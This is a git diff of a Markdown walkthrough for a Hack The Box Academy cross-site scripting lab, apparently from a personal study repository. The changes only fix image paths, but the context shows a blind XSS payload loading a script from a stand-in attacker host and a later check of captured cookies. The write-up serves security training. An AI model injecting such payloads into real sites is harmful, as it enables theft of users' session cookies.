@@ -23,7 +23,7 @@ Start the server below, make sure you are connected to the VPN, and access the `
 
 ```nano index.php```
 
-<img src="https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/php-code.png" >
+<img src="https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBoxAcademy/HTB-Academy-Cross-Site-Scripting-Skills-Assessment/images/php-code.png" >
 
 ## Let's start your server
 
@@ -34,14 +34,14 @@ Start the server below, make sure you are connected to the VPN, and access the `
 ```"><script src=http://hacker_ip:3333/myscript.js></script>```
 
 
-<img src="https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/inputs.png" >
-<img src="https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/php-server.png" >
+<img src="https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBoxAcademy/HTB-Academy-Cross-Site-Scripting-Skills-Assessment/images/inputs.png" >
+<img src="https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBoxAcademy/HTB-Academy-Cross-Site-Scripting-Skills-Assessment/images/php-server.png" >
 
 ### Great, it works!
 
 ### Let's check our cookie file.
 
-<img src="https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/cookie.png" >
+<img src="https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBoxAcademy/HTB-Academy-Cross-Site-Scripting-Skills-Assessment/images/cookie.png" >
 
 ## Happy Hacking!
 
